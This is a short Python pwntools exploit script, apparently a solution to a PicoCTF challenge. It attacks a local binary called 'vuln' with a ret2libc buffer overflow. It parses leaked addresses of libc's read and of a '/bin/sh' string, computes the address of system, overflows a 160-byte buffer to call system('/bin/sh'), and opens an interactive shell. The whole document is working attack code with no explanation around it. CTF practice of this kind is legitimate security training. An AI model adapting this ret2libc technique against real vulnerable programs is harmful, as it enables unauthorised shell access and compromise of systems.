#!/usr/bin/python

from pwn import *

p = process('./vuln')

libc = ELF('/lib/i386-linux-gnu/libc.so.6') # PicoCTF libc File /lib32/libc.so.6

libc_read = libc.symbols['read']
libc_system = libc.symbols['system']

p.recvuntil('read: ')

read_addr = int(p.recv(10),16)

p.recvuntil('useful_string: ')

binsh_addr = int(p.recv(10),16)

p.recvlines(3)

libc_base = read_addr - libc_read
system_addr = libc_base + libc_system

payload = "A"*160
payload += p32(system_addr)
payload += "A"*4
payload += p32(binsh_addr)

p.sendline(payload)

p.interactive()